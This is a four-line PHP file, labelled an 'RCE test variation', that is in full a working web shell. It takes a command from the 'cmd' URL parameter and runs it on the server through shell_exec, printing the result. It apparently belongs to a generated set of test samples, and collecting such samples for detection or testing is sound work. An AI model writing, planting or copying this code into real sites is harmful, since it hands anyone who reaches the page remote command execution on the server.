<?php
// RCE test variation #1456
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>